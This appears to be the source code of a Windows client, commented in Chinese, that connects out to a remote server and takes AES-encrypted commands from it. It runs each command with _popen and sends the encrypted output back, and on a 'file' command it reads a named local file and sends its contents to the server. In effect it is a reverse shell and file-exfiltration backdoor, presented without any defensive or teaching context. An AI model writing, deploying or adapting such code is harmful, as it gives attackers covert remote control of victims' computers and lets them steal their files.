#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <exception>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <stdexcept>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"libcrypto.lib")

#define BUF_SIZE 1024
#define AES_KEY_SIZE 128
#define AES_BLOCK_SIZE 16
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

using namespace std;

void error(const char* msg)
{
    fprintf(stderr, "%s\n", msg);
    ERR_print_errors_fp(stderr);
    exit(1);
}

int main(int argc, char* argv[])
{
    WSADATA wsa;
    SOCKET sockfd;
    struct sockaddr_in serv_addr;
    int portno;
    char buffer[BUF_SIZE];
    int n;

    // 检查命令行参数
    if (argc != 4)
    {
        error("usage: cli.exe server_ip portno  aes_key");
    }

    // 初始化Winsock库
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        error("WSAStartup failed");
    }

    // 创建套接字
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == INVALID_SOCKET)
    {
        error("socket creation failed");
    }

    // 设置服务器地址和端口号
    char* server_ip, * aes_key;


    server_ip = argv[1];
    portno = atoi(argv[2]);
    aes_key = argv[3];

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(server_ip);
    serv_addr.sin_port = htons(portno);

    // 连接服务器
    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR)
    {
        error("socket connect failed");
    }

    printf("Connected to server %s:%d\n", server_ip, portno);

    // 设置AES加密密钥
    EVP_CIPHER_CTX* enc_ctx, * dec_ctx;
    enc_ctx = EVP_CIPHER_CTX_new();
    dec_ctx = EVP_CIPHER_CTX_new();
    if (enc_ctx == NULL || dec_ctx == NULL)
    {
        error("EVP_CIPHER_CTX_new failed");
    }
    if (EVP_EncryptInit_ex(enc_ctx, EVP_aes_128_cbc(), NULL, (unsigned char*)aes_key, NULL) != 1)
    {
        error("EVP_EncryptInit_ex failed");
    }
    if (EVP_DecryptInit_ex(dec_ctx, EVP_aes_128_cbc(), NULL, (unsigned char*)aes_key, NULL) != 1)
    {
        error("EVP_DecryptInit_ex failed");
    }


    // 循环等待服务器传输命令
    while (1)
    {
        // 接收加密的命令
        memset(buffer, 0, BUF_SIZE);
        n = recv(sockfd, buffer, BUF_SIZE, 0);
        printf("%s", buffer);
        if (n <= 0)
        {
            perror("revc");
            fprintf(stderr, "%d\n", n);
            ERR_print_errors_fp(stderr);
            exit(1);
        }

        unsigned char decrypted_buffer[BUF_SIZE];
        memset(decrypted_buffer, 0, BUF_SIZE);

        int outlen = 0;
        int outlen2 = 0;
            
        const unsigned char* data = reinterpret_cast<const unsigned char*>(buffer);
        if (EVP_DecryptUpdate(dec_ctx, decrypted_buffer, &outlen, data, n) != 1)
        {
            error("EVP_DecryptUpdate failed");
        }
        int decrypted_length = outlen;
        if (EVP_DecryptFinal_ex(dec_ctx, decrypted_buffer + outlen, &outlen) != 1)
        {
            error("EVP_DecryptFinal_ex failed");
        }
        decrypted_length += outlen;
        outlen2 += decrypted_length;

        decrypted_buffer[decrypted_length] = '\0';

        
        // 如果收到"exit"命令，关闭套接字并退出循环
        const char* decrypted_data = reinterpret_cast<const char*>(decrypted_buffer);
        //printf("%s", decrypted_data);
        if (strncmp(decrypted_data, "exit", 4) == 0)
        {
            break;
        }
        else if (strncmp(decrypted_data, "file", 4) == 0)
        {
            // 获取本地文件路径和远程文件路径

            char* local_path = strtok((char *)decrypted_data + 4, " ");
            //char* remote_path = strtok(NULL, "\n");

            // 打开本地文件
            FILE* fp = fopen(local_path, "rb");
            if (fp == NULL)
            {
                error("file open failed");
            }

            // 读取本地文件内容
            int bytes_read;
            char file_buffer[BUF_SIZE];
            memset(file_buffer, 0, BUF_SIZE);

            
            
            while ((bytes_read = fread(file_buffer, 1, BUF_SIZE, fp)) > 0)
            {
                //error("file fread");
                // 加密并发送文件内容
                int encrypted_length = 0;       
                unsigned char encrypted_buffer[BUF_SIZE];
                memset(encrypted_buffer, 0, BUF_SIZE);


                try {
                    int outlen = 0;
                    const unsigned char* data1 = reinterpret_cast<const unsigned char*>(file_buffer);
                    if (EVP_EncryptUpdate(enc_ctx, encrypted_buffer, &outlen, data1, strlen(file_buffer)) != 1)
                    {
                        error("EVP_EncryptUpdate failed");
                    }
                    int encrypted_length = outlen;
                    if (EVP_EncryptFinal_ex(enc_ctx, encrypted_buffer + outlen, &outlen) != 1)
                    {
                        error("EVP_EncryptFinal_ex failed");
                    }
                    encrypted_length += outlen;
                    outlen2 += decrypted_length;

                    const char* encrypted_data = reinterpret_cast<const char*>(encrypted_buffer);
                    n = send(sockfd, encrypted_data, encrypted_length, 0);
                    if (n == SOCKET_ERROR)
                    {
                        error("socket send failed1111111111111");
                    }

                }
                catch (std::exception& e) {
                    fprintf(stderr, "%s\n", e.what());
                }




                // 清空缓冲区
                memset(file_buffer, 0, BUF_SIZE);
            }

            // 关闭本地文件
            fclose(fp);

        }
        else
        {
            // 执行命令并加密后发送执行结果给服务器
            FILE* fp = _popen(decrypted_data, "r");
            if (fp == NULL)
            {
                error("command execution failed");
            }

            // 读取命令执行结果并加密后发送给服务器
            memset(buffer, 0, BUF_SIZE);
            int i = 0;
            while (fgets(buffer + i, BUF_SIZE - i - 1, fp))
            {
                i = strlen(buffer);
            }

            unsigned char encrypted_buffer[BUF_SIZE];
            memset(encrypted_buffer, 0, BUF_SIZE);

            try {
                int outlen = 0;
                const unsigned char* data1 = reinterpret_cast<const unsigned char*>(buffer);
                if (EVP_EncryptUpdate(enc_ctx, encrypted_buffer, &outlen, data1, strlen(buffer)) != 1)
                {
                    error("EVP_EncryptUpdate failed");
                }
                int encrypted_length = outlen;
                if (EVP_EncryptFinal_ex(enc_ctx, encrypted_buffer + outlen, &outlen) != 1)
                {
                    error("EVP_EncryptFinal_ex failed");
                }
                encrypted_length += outlen;
                outlen2 += decrypted_length;

                const char* encrypted_data = reinterpret_cast<const char*>(encrypted_buffer);
                n = send(sockfd, encrypted_data, encrypted_length, 0);
                if (n == SOCKET_ERROR)
                {
                    error("socket send failed");
                }

            }
            catch (std::exception& e) {
                fprintf(stderr, "%s\n", e.what());
            }

            _pclose(fp);
        }



        // 关闭命令执行结果的文件指针


    }

    // 清理加密上下文和套接字
    EVP_CIPHER_CTX_free(enc_ctx);
    EVP_CIPHER_CTX_free(dec_ctx);
    closesocket(sockfd);
    WSACleanup();
    return 0;
}
